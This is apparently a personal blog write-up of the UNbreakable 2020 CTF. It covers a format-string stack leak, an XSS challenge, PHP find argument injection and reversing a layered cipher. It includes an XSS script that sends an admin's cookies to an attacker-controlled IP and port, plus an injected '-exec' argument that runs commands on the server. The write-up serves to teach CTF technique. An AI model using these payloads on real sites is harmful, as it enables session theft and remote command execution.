---
layout: post
title: "Breaking the UNbreakable 2020"
date: 2020-11-09 10:00:00 +0300
description: CTF writeup
tag: [CTF, Writeup, UNbreakable]
img: UNbreakable2020/title.png
---

On its first edition, UNbreakable is a promising CTF competition for high school and college students. It is hosted on the educational platform [cyberedu.ro](https://cyberedu.ro/) and backed by Bit Sentinel.
Although aimed at students, the challanges are not that easy, so it is a good exercise for anyone to try solve them. In a nutshell I'd say they are supposed to be solved with little technical knowledge, rather more ingenuity and documentation research. Some of them I was able to solve during the contest, some after and some are still a mystery, as for now there are no other writeups online. Participation is open for anyone, but only students may receive prizes.  
Now the challanges!

## better-cat

We are provided with an elf binary that asks for a password.  
Running a simple `strings cat.elf` on the file is enough to find the "password" for the flag or we could just simply build the flag from the output.

## notafuzz

So we're provided with the binary of a web service we can interact with over TCP. The attached file may not be so obvious at fist.  
![service interaction]({{site.baseurl}}/assets/img/posts/UNbreakable2020/naf-test.png)
So the program seems mostly to repeat what we say. If you are eager you can observe that a newline was omitted at some point. Anyway we better try to decompile the binary to see what happens in there. I preffer using Ghidra for this.
![decompiled code]({{site.baseurl}}/assets/img/posts/UNbreakable2020/naf-decompiled.png)
Studying the main function we see that all this program does it to repeat what we're saying. But there is a special case the third time we enter our input, the only thing different is that our input is printed with printf instead of puts.  
Doing some research you may find out that this allows for a format string attack. That means that we can use format strings (like `%s`) to read from memory starting from the address of the specified buffer (ie our input). After the declaration of the input buffer a few other variables are declared so we better see what they hold inside. The input buffer may hold a maximum of 1008 characters, so we may craft a payload that will try to read bytes from the stack in hexadecimal format in python `python -c "print(\"%08X\"*250)"`. This payload will work only the third time we enter input.
![sending the payload]({{site.baseurl}}/assets/img/posts/UNbreakable2020/naf-payload.png)
Ok, now we should translate the response from server. You can paste the input into a hex editor (I recommend Bless) or use xxd `echo "response" | xxd -r -u -p`.
![translated payload]({{site.baseurl}}/assets/img/posts/UNbreakable2020/naf-response.png)
Great! It seems the flag is in the output, just not in a very convienent form. The catch here is that X format printed sizeof(int) bytes in a little-endian representation. I used this format as it would print more memory than reading one byte at a time. You might rewrite it to its original form yourself or write a simple script to do it for you:
```python
message = "{ftcflagXXX}"
reordered = [''.join(reversed(message[index: index + 4])) for index in range(0, len(message), 4)]
reordered = ''.join(reordered)[:-3]
print (reordered)
```

## manual-review

We are presented a web platform where we can contact an admin, see the tickets in a chat-like manner and modify our account details. Usually this kind of challanges are supposed to make you annoy the admin with some dirty XSS and maybe try to steal his cookies.
![challenge overview]({{site.baseurl}}/assets/img/posts/UNbreakable2020/mr-overview.jpg)
Seems like there is no XSS filtering, so we have just to exploit this XSS vulnerability in the support system. Unfortunately the session cookie is http-only, so it can't be stolen, but anyway, for the sake of fun let's try to steal sum cookiez. It seems there is no obvious way to get feedback from admin on the platform, so let's use javascript to exfiltrate his cookies to our server.  
For this you must have [port forwarding](https://www.lifewire.com/how-to-port-forward-4163829) set up. Mostly you have to assign a static IP to your PC and set up port forwarding in your router config (under NAT settings) to forward traffic received on a specified public port of your choice to one on your machine. Then we can listen on that port with netcat `ncat -nlvp YOUR_PUBLIC_PORT`. Alternatively you can use Burp collaborator, but that is not included in the community version. Now it's quite easy to forge a payload for the admin to send us his cookies:  
```javascript
<script>
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "PUBLIC_IP:FORWARDED_PORT/?cookie=" + btoa(document.cookie));
xhttp.send();
</script>
```
Encoding to base64 will make sure that this will be a valid url.  
Looking at the request received from admin we can see the cookies are irrelevant and the flag was in its user agent. Who would have guessed it was there?
![admin response]({{site.baseurl}}/assets/img/posts/UNbreakable2020/mr-response.jpg)

## the-code
We're given the php code of a webpage and we have to find somehow the flag.
![challange overview]({{site.baseurl}}/assets/img/posts/UNbreakable2020/tc-overview.png)
Setting the start parameter in the URL will make the page active and we can inject our payload in args parameter, which would represent the name of the file we're searching in **/tmp**.
Some nasty shell metacharacters are blocked and escapeshellcmd is used to escape our input. Also the response from server is encoded in a hard to reverse way.  
Escapeshellcmd is supposed to escape any characters in a string that might be used to trick a shell command into executing arbitrary commands. On its php manual page we see a warning: **escapeshellcmd() should be used on the whole command string, and it still allows the attacker to pass arbitrary number of arguments. For escaping a single argument escapeshellarg() should be used instead.** Now we have a direction, we should use some parameter of find to do some bad stuff.  
`find --help` reveals an option -exec that allows the execution of arbitrary commands. That means we have a semi-blind RCE. One thing to note is that -exec runs the specified command only if it has found at least one file (it may run just once or once for each file found, depending on syntax). In order to get some results with `find /tmp -iname OUR_INPUT` we can specify the wildcard **\*** which in this case will match all files inside the folder, including the folder itself.  
So far visiting `/?start=1&arg=*` will yield some encoded result ("L3RTCAOVDG1WL3N0YXJ0LNNOCG==") and we know we can run arbitrary semi-blind commands on the server. Ironic enough all I can think of is to use this find based RCE to maybe find a flag file on the server. After a long fuzzing time I found that `/?start=&arg=* -exec find / -iname flag ;` found something. Now the road splits in half, you may try to decode this by hand trying to guess which letter is uppercase and which not or you might try to figure out a way to exfiltrate data out-of-band to your server, if the firewall allows you to do that. I preffered to do it by hand during the contest and I found that the file was located under the root of the server.  
So basically anyone who'd try to access **/flag** randomly would get the flag.

## lost-message
During the contest I avoided this challenge as I saw it as being very time consuming and involving a degree of trial and error. In the end it proved to be more
of a programming challenge, nothing theoretically hard, the code was written such that it may be reused when decrypting.  
The sequence used for the encryption is:
```python
cipher = enc1(enc3(enc4(premessage("secret"), 13),"recomanded"), "zxdfiuypka")
cipher = "".join(map(chr, enc2(cipher, 35)))
```
So we should try to reverse engineer it step by step. We may expect that some steps are not fully reversible.
### enc2
This step is not hard to reverse, but it's interesting to see that the encryption is not possible for just any message.
```python
# libraries and globals used in the script
import sys, random, binascii, hashlib, re, math, os
from string import ascii_uppercase as asc
from itertools import product as d
import hashlib

upper = {ascii:chr(ascii) for ascii in range(65,91)}
lower = {ascii:chr(ascii) for ascii in range(97,123)}
digit = {ascii:chr(ascii) for ascii in range(48,58)}

def enc2(string, key):
    for c in string:
        o = ord(c)
        if (o not in upper and o not in lower) or o in digit:
            yield o
        else:
            if o in upper and o + key % 26 in upper:
                yield o + key % 26
            elif o in lower and o + key % 26 in lower:
                yield o + key % 26.
            else:
                yield o + key % 26 -26

# Fully reversible
def dec2(string, key):
    for c in string:
        o = ord(c)
        if (o not in upper and o not in lower) or o in digit:
            yield o
        if o in upper and o - key % 26 in upper:
            yield o - key % 26
        elif o in lower and o - key % 26 in lower:
            # This is invalid as it will return a float and cause an exception to be thrown
            yield o - key % 26.
        else:
            yield o - key % 26 + 26

enc_message = "FNFWCiZJGWWAWZTKYLLKDVNiWCVYViBYHXDiXFBEMiKYEZQMMPKNRiQXZVBQ"
dec_message = "".join(map(chr, dec2(enc_message, 35)))
```
### enc1
The message is shuffled by placing it in a matrix and outputting its lines in an order derived from the key.
```python
def enc1(msg, key):
    cipher = ""
    k_indx = 0
    msg_len = float(len(msg))
    msg_lst = list(msg)
    key_lst = sorted(list(key))
    col = len(key)
    row = int(math.ceil(msg_len / col))
    fill_null = int((row * col) - msg_len)
    msg_lst.extend('z' * fill_null)
    matrix = [msg_lst[i: i + col]
            for i in range(0, len(msg_lst), col)]


    for _ in range(col):
        curr_idx = key.index(key_lst[k_indx])
        cipher += ''.join([row[curr_idx]
                        for row in matrix])
        k_indx += 1

    return cipher

# Partially decryptable, will be padded with zs to fit a certain length
def dec1(msg, key):
    plaintext = ""
    k_indx = 0
    msg_len = float(len(msg))
    msg_lst = list(msg)
    key_lst = sorted(list(key))
    col = len(key)
    row = int(math.ceil(msg_len / col))
    matrix = [["" for c in range(col)] for r in range(row)]

    for index in range(col):
        curr_idx = key.index(key_lst[k_indx])
        for r in range(row):
            matrix[r][curr_idx] = msg[row * index + r]
        k_indx += 1

    plaintext = "".join([item for sublist in matrix for item in sublist])
    return plaintext

# I strip the trailing zs because they don't seem to belong to the uppercase cipher
dec_message = dec1(dec_message, "zxdfiuypka").strip("z")
```
### enc3
This one was the hardest, as it spawns a tree of possibilities from two sources. Take a moment to look at the encryption function.  
First observe enc is an encryption table derived solely from the key. Our luck is that at least this is reversible, so we may invert it to get a decryption table.  
We should first get the value of **l** from the cipher, then get the value of text from **t(text)**. Both situations spawn multiple possibilities.  
Our first task would be to rebuild **l** from the cipher. Using the decryption table we can get all pairs **(a, b)** in **"l"**, but we should be careful that if we find **b == "Z"** we can't say whether b was actually **"Z"** or **""**. Looking at the regex and what it does you can observe that the output of findall allows us to rebuild the original text. Out original text is all uppercase characters in **t(plaintext)**. We better hope the plaintext was indeed made only of uppercase letters.  
**t(text)** is a hardly reversible function, an **"I"** in the output in indistinguishable from an **"I"** and a **"J"** in the input and it doesn't preserve the casing of letters. Our luck is that we might have to deal only with the **"I"** problem as the next layers are not case sensitive. We might decide later the letter casing.  
Those observations should be enough to make an attempt at reversing this encryption.
```python
def enc3(text, key):
    t=lambda x: x.upper().replace('J','I')
    s=[]
    for _ in t(key+asc):

        if _ not in s and _ in asc:

            s.append(_)

    m=[s[i:i+5] for i in range(0,len(s),5)]
    # Enc is an encryption table derived from the key
    enc={row[i]+row[j]:row[(i+1)%5]+row[(j+1)%5] for row in m for i,j in d(range(5),repeat=2) if i!=j}
    enc.update({col[i]+col[j]:col[(i+1)%5]+col[(j+1)%5] for col in zip(*m) for i,j in d(range(5),repeat=2) if i!=j})
    enc.update({m[i1][j1]+m[i2][j2]:m[i1][j2]+m[i2][j1] for i1,j1,i2,j2 in d(range(5),repeat=4) if i1!=i2 and j1!=j2})
    # The regex takes pairs of two chars, and if the second one is duplicate replaces it with empty string
    # ie "ABCCDE" -> [("A", "B"), ("C", ""), ("D", "E")]
    # l leaks the plaintext partially
    # the text better not have numbers or special symbols
    l=re.findall(r'(.)(?:(?!\1)(.))?',''.join([_ for _ in t(text) if _ in asc]))

    return ''.join(enc[a+(b if b else 'Z')] for a,b in l)

def dec3(text, key):
    t=lambda x: x.upper().replace('J','I')
    s=[]
    for _ in t(key+asc):
        if _ not in s and _ in asc:
            s.append(_)

    m=[s[i:i+5] for i in range(0,len(s),5)]
    enc={row[i]+row[j]:row[(i+1)%5]+row[(j+1)%5] for row in m for i,j in d(range(5),repeat=2) if i!=j}
    enc.update({col[i]+col[j]:col[(i+1)%5]+col[(j+1)%5] for col in zip(*m) for i,j in d(range(5),repeat=2) if i!=j})
    enc.update({m[i1][j1]+m[i2][j2]:m[i1][j2]+m[i2][j1] for i1,j1,i2,j2 in d(range(5),repeat=4) if i1!=i2 and j1!=j2})
    dec = {val:key for key, val in enc.items()}

    t_possibilities = []
    def expand_possibilities(possibilities, current_word, remaining_string):
        if len(remaining_string) == 1:
            return
        elif len(remaining_string) == 0:
            possibilities.append(current_word)
        else:
            slice = remaining_string[:2]
            # When the portion is not a duplicate
            expand_possibilities(possibilities, current_word + dec[slice], remaining_string[2:])
            # If we have a duplicate in the original plaintext only one letter was encrypted
            if dec[slice][1] == "Z":
                expand_possibilities(possibilities, current_word + dec[slice][0], remaining_string[2:])
    expand_possibilities(t_possibilities, "", text)

    plaintext_possibilities = []
    for t_possibility in t_possibilities:
        plaintext_possibility = []
        for char in t_possibility[:]:
            if char == "I":
                plaintext_possibility.append(["I", "J"])
            else:
                plaintext_possibility.append([char])
        plaintext_possibility = d(*plaintext_possibility)
        plaintext_possibility = ["".join(possibility) for possibility in plaintext_possibility]

        plaintext_possibilities += plaintext_possibility
    return plaintext_possibilities

# Now we'll have a list of possibilities
# And this is how you also achieve security through misspelling
dec_message = dec3(dec_message, "recomanded")
```
### enc4
This one is fully reversible and not hard to reverse. It just arranges the plaintext in zigzag inside a matrix, then just outputs the letters in another order.
```python
def enc4(text, key, debug=False):
    r = [['\n' for i in range(len(text))]
                  for j in range(key)]
    dir_down = False
    row, col = 0, 0
    for i in range(len(text)):
        if (row == 0) or (row == key - 1):
            dir_down = not dir_down
        r[row][col] = text[i]
        col += 1
        if dir_down:
            row += 1
        else:
            row -= 1
    result = []
    for i in range(key):
        for j in range(len(text)):
            if r[i][j] != '\n':
                result.append(r[i][j])
    return("" . join(result))

def dec4(text, key):
    r = [['\n' for i in range(len(text))]
                  for j in range(key)]
    # Fill the matrix with placeholders ("x")
    dir_down = False
    row, col = 0, 0
    for i in range(len(text)):
        if (row == 0) or (row == key - 1):
            dir_down = not dir_down
        r[row][col] = "x"
        col += 1
        if dir_down:
            row += 1
        else:
            row -= 1
    # Fill the placeholders with their true value
    result = []
    text_index = 0
    for i in range(key):
        for j in range(len(text)):
            if r[i][j] != '\n':
                r[i][j] = text[text_index]
                text_index += 1
    # Now reconstruct the string
    plaintext = ""
    dir_down = False
    row, col = 0, 0
    for i in range(len(text)):
        if (row == 0) or (row == key - 1):
            dir_down = not dir_down
        plaintext += r[row][col]
        col += 1
        if dir_down:
            row += 1
        else:
            row -= 1
    return plaintext

# Apply decryption to each susceptible cipher
dec_message = list(map(lambda x: dec4(x, 13), dec_message))
```
### premessage
Now just account for a lil more possibilities.
```python
def premessage(text):
    text = text.replace("_", "Q")
    return text

def de_premessage(cipher_possibilities):
    possibilities = []
    for cipher_possibility in cipher_possibilities:
        expanded_possibilities = []
        for char in cipher_possibility:
            if char == "Q":
                expanded_possibilities.append(["Q", "_"])
            else:
                expanded_possibilities.append([char])
        expanded_possibilities = d(*expanded_possibilities)
        expanded_possibilities = ["".join(possibility) for possibility in expanded_possibilities]

        possibilities += expanded_possibilities
    return possibilities
dec_message = de_premessage(dec_message)
```
### the flag
Well now that we have all candidate plaintexts we should output them all, prefferably with their associated flags too.
```python
for message in dec_message:
    print (message)
    hash = hashlib.sha256(message.encode('utf-8')).hexdigest()
    print ("ctf{" + hash + "}")
```
We could grep the values gradually as they resemble more and more a human-readable string:  
`python dec.py | grep -A 1 KEEP_YOUR_`
